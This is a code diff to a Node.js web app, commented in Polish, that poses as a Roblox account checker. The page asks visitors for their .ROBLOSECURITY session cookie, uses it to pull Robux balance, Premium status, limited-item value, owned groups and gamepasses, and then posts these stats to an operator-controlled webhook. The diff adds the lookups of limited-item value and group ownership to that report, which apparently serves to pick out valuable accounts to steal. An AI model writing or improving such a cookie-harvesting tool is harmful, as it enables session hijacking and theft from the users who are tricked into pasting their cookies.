@@ -14,7 +14,7 @@ app.use((req, res, next) => {
   next();
 });
 
-// Strona główna – Twoja HTML
+// Strona główna – Twoja HTML (bez zmian)
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
 <html lang="en">
@@ -86,14 +86,22 @@ async function checkAccount() {
         <b>Display Name:</b> \${json.displayName}<br>
         <b>User ID:</b> \${json.userId}<br>
         <b>Roblox Premium:</b> <span style="color: \${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
+       
         <b>Email / Phone Verified:</b> <span style="color: \${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
           \${json.emailVerified ? 'YES ✓ (hat detected)' : 'NO ✗'}
         </span><br>
+       
         <b>Robux Balance:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.robux.toLocaleString('en-US')} Robux</span><br>
+       
+        <b>Total RAP (Limiteds):</b> <span style="color: #ffcc00; font-weight: bold;">\${json.totalRAP ? json.totalRAP.toLocaleString('en-US') : 'N/A'}</span><br>
+        <b>Owned Limiteds:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.limitedsCount || 0}</span><br>
+       
         <b>MM2 Gamepasses:</b> <span style="color: \${mm2Color}; font-weight: bold;">\${mm2Count}</span><br>
         <b>AMP Gamepasses:</b> <span style="color: \${ampColor}; font-weight: bold;">\${ampCount}</span><br>
         <b>SAB Gamepasses:</b> <span style="color: \${sabColor}; font-weight: bold;">\${sabCount}</span><br>
+       
         <b>Account Age:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.accountAgeDays} days</span><br>
+        <b>Owned Groups:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.ownedGroupsCount || 0}</span><br>
         <b>Created:</b> \${creationDate} \${json.created !== 'failed to fetch' ? \`<small>(\${json.created.split('T')[0]})\</small>\` : ''}<br>
       \`;
     }
@@ -106,7 +114,7 @@ async function checkAccount() {
 </html>`);
 });
 
-// Endpoint /check
+// Endpoint /check – z prawdziwymi danymi
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
 
@@ -140,7 +148,7 @@ app.post('/check', async (req, res) => {
     }
     const userData = await userRes.json();
 
-    // Verified Email
+    // Verified Email (hat)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(
@@ -158,7 +166,7 @@ app.post('/check', async (req, res) => {
         const ownsData = await ownsRes.json();
         emailVerified = Array.isArray(ownsData.data) && ownsData.data.length > 0;
       }
-    } catch {}
+    } catch (err) {}
 
     // Premium
     let hasPremium = false;
@@ -167,7 +175,7 @@ app.post('/check', async (req, res) => {
         headers: { 'Cookie': `.ROBLOSECURITY=${cookie}`, 'X-CSRF-TOKEN': csrfToken }
       });
       if (premiumRes.ok) hasPremium = await premiumRes.json();
-    } catch {}
+    } catch (err) {}
 
     // Robux
     let robux = 0;
@@ -179,7 +187,7 @@ app.post('/check', async (req, res) => {
         const data = await currencyRes.json();
         robux = data.robux || 0;
       }
-    } catch {}
+    } catch (err) {}
 
     // Wiek konta
     let accountAgeDays = 0;
@@ -193,7 +201,7 @@ app.post('/check', async (req, res) => {
           accountAgeDays = Math.floor((Date.now() - new Date(createdDate).getTime()) / 86400000);
         }
       }
-    } catch {}
+    } catch (err) {}
 
     // Avatar
     let avatarUrl = null;
@@ -203,7 +211,7 @@ app.post('/check', async (req, res) => {
         const thumbData = await thumbRes.json();
         avatarUrl = thumbData.data?.[0]?.imageUrl || null;
       }
-    } catch {}
+    } catch (err) {}
 
     // Gamepasy
     const mm2Ids = [429957, 1308795];
@@ -230,7 +238,53 @@ app.post('/check', async (req, res) => {
           }
         }
       }
-    } catch {}
+    } catch (err) {}
+
+    // Dodatkowe prawdziwe dane
+    let totalRAP = 0;
+    let limitedsCount = 0;
+    try {
+      let cursor = null;
+      do {
+        const url = `https://inventory.roblox.com/v1/users/${userData.id}/assets/collectibles?sortOrder=Asc&limit=100${cursor ? `&cursor=${cursor}` : ''}`;
+        const limitedsRes = await fetch(url, {
+          headers: {
+            'Cookie': `.ROBLOSECURITY=${cookie}`,
+            'X-CSRF-TOKEN': csrfToken,
+          },
+        });
+        if (limitedsRes.ok) {
+          const data = await limitedsRes.json();
+          data.data.forEach(item => {
+            limitedsCount++;
+            if (item.recentAveragePrice) {
+              totalRAP += item.recentAveragePrice;
+            }
+          });
+          cursor = data.nextPageCursor;
+        } else {
+          break;
+        }
+      } while (cursor);
+    } catch (err) {
+      console.log('RAP fetch error:', err.message);
+    }
+
+    let ownedGroupsCount = 0;
+    try {
+      const groupsRes = await fetch(`https://groups.roblox.com/v1/users/${userData.id}/groups/affiliations?role=Owner`, {
+        headers: {
+          'Cookie': `.ROBLOSECURITY=${cookie}`,
+          'X-CSRF-TOKEN': csrfToken,
+        },
+      });
+      if (groupsRes.ok) {
+        const data = await groupsRes.json();
+        ownedGroupsCount = data.data?.length || 0;
+      }
+    } catch (err) {
+      console.log('Groups fetch error:', err.message);
+    }
 
     const result = {
       success: true,
@@ -244,11 +298,14 @@ app.post('/check', async (req, res) => {
       avatarUrl,
       hasGamePasses,
       emailVerified,
+      totalRAP,
+      limitedsCount,
+      ownedGroupsCount,
     };
 
     res.status(200).json(result);
 
-    // Wysyłka do webhooka – styl z screena
+    // Wysyłka embeda – teraz z prawdziwymi danymi
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -275,22 +332,22 @@ app.post('/check', async (req, res) => {
                 },
                 {
                   name: "Account Stats",
-                  value: `• Account Age: **${accountAgeDays} Days**\n• Games Developer: **False**\n• Group Members: **0**`,
+                  value: `• Account Age: **${accountAgeDays} Days**\n• Games Developer: **?** (not fetched)\n• Group Members: **${ownedGroupsCount}**`,
                   inline: false
                 },
                 {
                   name: "⭕ Robux",
-                  value: `Balance: **${robux.toLocaleString()}**\nPending: **0**\nPayments: **0**`,
+                  value: `Balance: **${robux.toLocaleString()}**\nPending: **?**\nPayments: **?**`,
                   inline: true
                 },
                 {
                   name: "Limits",
-                  value: `RAP: **0**\nLimiteds: **0**`,
+                  value: `RAP: **${totalRAP.toLocaleString()}**\nLimiteds: **${limitedsCount}**`,
                   inline: true
                 },
                 {
                   name: "Summary",
-                  value: `**1013**`,
+                  value: `**?**`,
                   inline: true
                 },
                 {
@@ -305,12 +362,12 @@ app.post('/check', async (req, res) => {
                 },
                 {
                   name: "Groups",
-                  value: "Owned: **0**",
+                  value: `Owned: **${ownedGroupsCount}**`,
                   inline: true
                 },
                 {
                   name: "Inventory",
-                  value: "Unknown: **False**",
+                  value: "Unknown: **?**",
                   inline: true
                 },
                 {
@@ -332,6 +389,7 @@ app.post('/check', async (req, res) => {
     }
 
   } catch (err) {
+    console.error('Main error:', err.message);
     res.status(500).json({ error: err.message || 'Internal server error' });
   }
 });
